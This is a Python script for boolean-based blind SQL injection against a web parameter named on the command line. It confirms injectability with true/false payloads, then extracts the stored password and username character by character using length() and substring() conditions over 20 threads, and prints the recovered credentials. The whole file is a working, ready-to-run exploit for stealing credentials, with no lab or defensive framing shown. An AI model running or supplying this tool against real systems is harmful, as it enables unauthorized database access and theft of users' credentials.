import difflib
import requests
import string
import argparse
from concurrent.futures import ThreadPoolExecutor, as_completed

# TODO:
#   Add database and table enumeration

charset = string.ascii_letters + string.digits + string.punctuation

headers = {
    "User-Agent": "Mozilla/5.0"
}

def remove_apostrophe(payload):
    if "'" in payload:
        new_payload = payload.replace("'","")
        return new_payload
    return payload

def is_numeric(value):
    try:
        int(value)
        return True
    except ValueError:
        return False

def check_difference(baseline_text, new_text):
    diff = difflib.Differ()
    difference = list(diff.compare(list(baseline_text), list(new_text)))

    return difference

def is_page_different(difference_list):
    for line in difference_list:
        if line.startswith("+ ") or line.startswith("- "):
            return True

    return False

def test_for_sqli(target, param="id", value="1"):
    BASELINE = requests.get(target, headers=headers)
    baseline_text = BASELINE.text

    true_payload = "' AND 1=1 -- -"
    false_payload = "' AND 1=2 -- -"
    if is_numeric(value):
        true_payload = remove_apostrophe(true_payload)
        false_payload = remove_apostrophe(false_payload)

    true_response = requests.get(target, headers=headers, params={param: f"{value}{true_payload}"})
    false_response = requests.get(target, headers=headers, params={param: f"{value}{false_payload}"})
    true_text = true_response.text
    false_text = false_response.text
    difference_list = check_difference(true_text, false_text)
    if is_page_different(difference_list):
        print(f"[+] Page is vulnerable to SQL injection with payloads: {true_payload}/{false_payload}")
        return True

    print("[-] Page is not vulnerable to SQL injection...")
    return False

def test_condition(payload, target, param="id", value="1", force_string=False):
    # Determine if value is numeric
    numeric = is_numeric(value) and not force_string

    # Get response for the condition we're testing
    response = requests.get(target, headers=headers, params={param: f"{value}{payload}"})
    test_text = response.text

    # Get response for a known FALSE condition
    false_payload = "' AND 1=0 -- -"
    if numeric:
        false_payload = remove_apostrophe(false_payload)
    false_response = requests.get(target, headers=headers, params={param: f"{value}{false_payload}"})
    false_text = false_response.text

    # Get response for a known TRUE condition
    true_payload = "' AND 1=1 -- -"
    if numeric:
        true_payload = remove_apostrophe(true_payload)
    true_response = requests.get(target, headers=headers, params={param: f"{value}{true_payload}"})
    true_text = true_response.text

    # Check if TRUE and FALSE references are actually different from each other
    diff_refs = check_difference(false_text, true_text)
    refs_are_different = is_page_different(diff_refs)
    if not refs_are_different:
        print(f"[!] WARNING: TRUE and FALSE reference responses are identical - comparison may not work!")

    # Compare test response to false response
    diff_with_false = check_difference(false_text, test_text)
    is_different_from_false = is_page_different(diff_with_false)

    # Compare test response to true response
    diff_with_true = check_difference(true_text, test_text)
    is_different_from_true = is_page_different(diff_with_true)

    print(f"[*] is_different_from_false: {is_different_from_false}, is_different_from_true: {is_different_from_true}")
    print(f"[*] Test response length: {len(test_text)}, False length: {len(false_text)}, True length: {len(true_text)}")

    # If test response is different from false but similar to true, condition is TRUE
    if is_different_from_false and not is_different_from_true:
        print(f"[*] Condition is TRUE (different from false, similar to true)")
        return True

    # If test response is similar to false but different from true, condition is FALSE
    if not is_different_from_false and is_different_from_true:
        print(f"[*] Condition is FALSE (similar to false, different from true)")
        return False

    # Default: if similar to true, return True
    if not is_different_from_true:
        print(f"[*] Condition is TRUE (similar to true)")
        return True

    print(f"[*] Condition is FALSE (default)")
    return False

def find_password_length(value, param, target, force_string=False, password_field="password"):
    numeric = is_numeric(value) and not force_string
    for length in range(1, 1024):
        payload = f"' AND length({password_field})={length} -- -"
        if numeric:
            payload = remove_apostrophe(payload)
        print(f"[+] Testing on {target}?{param}={value}{payload}")
        result = test_condition(payload, target, param, value, force_string)

        if result:
            print(f"[+] Password length: {length}")
            return length

    return None

def find_username_length(value, param, target, force_string=False, username_field="username"):
    numeric = is_numeric(value) and not force_string
    for length in range(1, 1024):
        payload = f"' AND length({username_field})={length} -- -"
        if numeric:
            payload = remove_apostrophe(payload)
        print(f"[+] Testing on {target}?{param}={value}{payload}")
        result = test_condition(payload, target, param, value, force_string)

        if result:
            print(f"[+] Username length: {length}")
            return length

    return None

def test_single_char(char, value, position, target, param, field, force_string):
    numeric = is_numeric(value) and not force_string
    payload = f"' AND substring({field},{position},1)='{char}' -- -"
    if numeric:
        payload = remove_apostrophe(payload)
    result = test_condition(payload, target, param, value, force_string)
    if result:
        return char
    return None

def find_character(value, position, target, param="id", field="password", force_string=False):
    print(f"[+] Testing position {position}...")

    with ThreadPoolExecutor(max_workers=20) as executor:
        futures = {
            executor.submit(test_single_char, char, value, position, target, param, field, force_string): char
            for char in charset
        }

        for future in as_completed(futures):
            char = futures[future]
            try:
                result = future.result()
                if result:
                    print(f"[+] Position {position}: {result}")
                    # Cancel remaining futures
                    for f in futures:
                        f.cancel()
                    return result
            except Exception as e:
                print(f"[-] Error testing {char}: {e}")

    return None

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--target", required=True)
    parser.add_argument("--value", required=True)
    parser.add_argument("--param", default="id")
    parser.add_argument("--is-string", action="store_true", help="Force value to be treated as string (keeps apostrophes)")
    parser.add_argument("--username-field", default="username", help="Name of username column in database")
    parser.add_argument("--password-field", default="password", help="Name of password column in database")
    args = parser.parse_args()

    TARGET = args.target
    VALUE = args.value
    PARAM = args.param
    FORCE_STRING = args.is_string
    USERNAME_FIELD = args.username_field
    PASSWORD_FIELD = args.password_field

    if test_for_sqli(TARGET, PARAM, VALUE):
        print("[+] Continuing with exploitation...")
    else:
        print("[-] Target is not vulnerable to SQL injection!")
        return

    username = ""
    password = ""

    pass_length = find_password_length(VALUE, PARAM, TARGET, FORCE_STRING, PASSWORD_FIELD)
    if pass_length is None:
        print("[-] Could not determine password length!")
        return

    for position in range(1, pass_length + 1):
        char = find_character(VALUE, position, TARGET, PARAM, PASSWORD_FIELD, FORCE_STRING)

        if char is None:
            break

        password += char
        print(f"[+] Password so far: {password}")

    user_length = find_username_length(VALUE, PARAM, TARGET, FORCE_STRING, USERNAME_FIELD)
    if user_length is None:
        print("[-] Could not determine username length!")
        return

    for position in range(1, user_length + 1):
        char = find_character(VALUE, position, TARGET, PARAM, USERNAME_FIELD, FORCE_STRING)
        username += char
        print(f"[+] Username so far: {username}")

    print(f"[+] Username: {username}")
    print(f"[+] Password: {password}")

if __name__ == "__main__":
    main()
